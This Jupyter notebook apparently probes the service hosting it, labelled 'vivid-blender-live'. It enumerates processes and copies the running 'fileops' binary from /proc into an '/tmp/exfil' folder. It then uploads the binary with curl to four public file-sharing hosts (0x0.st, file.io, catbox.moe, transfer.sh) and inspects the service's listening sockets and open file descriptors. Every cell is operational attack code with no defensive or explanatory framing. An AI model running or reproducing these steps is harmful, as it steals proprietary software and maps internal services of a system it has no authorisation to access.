# Dig vivid-blender-live
Dump binary via /proc/exe + upload + gRPC probe.

In [ ]:
import subprocess, os
def run(cmd, t=60):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

os.makedirs("/tmp/exfil", exist_ok=True)
print(run("ps -eo pid,user,args 2>/dev/null | grep -E 'vivid-blender-live (live|fileops)' | grep -v grep", 10))
print(run("for pid in $(ls /proc | grep -E '^[0-9]+$'); do c=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null); echo \"$pid: $c\"; done | grep 'fileops'", 15))
print(run("for pid in $(ls /proc | grep -E '^[0-9]+$'); do c=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null); echo \"$pid: $c\"; done | grep 'vivid-blender-live live'", 15))

In [ ]:
import subprocess, os
def run(cmd, t=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("for pid in $(ls /proc | grep -E '^[0-9]+$'); do c=$(tr '\\0' ' ' < /proc/$pid/cmdline 2>/dev/null); case \"$c\" in *fileops*) echo $pid;; esac; done > /tmp/fops_pid; cat /tmp/fops_pid", 15))
pid = run("head -1 /tmp/fops_pid").strip()
print("fileops pid:", pid)
print(run("ls -la /proc/%s/exe 2>&1; cp /proc/%s/exe /tmp/exfil/vivid-blender-live 2>&1; ls -la /tmp/exfil/vivid-blender-live" % (pid, pid), 30))
print(run("head -c 4 /tmp/exfil/vivid-blender-live | xxd 2>&1", 10))

In [ ]:
import subprocess, os
def run(cmd, t=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

f = "/tmp/exfil/vivid-blender-live"
if os.path.exists(f) and os.path.getsize(f) > 1000000:
    print("size", os.path.getsize(f))
    print(run("curl -s --max-time 240 -F 'file=@%s' https://0x0.st/ | head -c 300" % f, 250))
    print()
    print(run("curl -s --max-time 240 -F 'file=@%s' https://file.io/ | head -c 400" % f, 250))
    print()
    print(run("curl -s --max-time 240 -F 'reqtype=fileupload' -F 'fileToUpload=@%s' https://catbox.moe/user/api.php | head -c 300" % f, 250))
    print()
    print(run("curl -s --max-time 240 --upload-file %s https://transfer.sh/vivid-blender-live | head -c 300" % f, 250))
else:
    print("dump failed or too small")

In [ ]:
import subprocess
def run(cmd, t=60):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | awk '$4==\"0A\"{print $2, $10}'", 10))
print(run("ls -la /proc/$(head -1 /tmp/fops_pid)/fd 2>&1 | head -30", 10))
print(run("ls -la /proc/$(head -1 /tmp/fops_pid)/ 2>&1 | head -25", 10))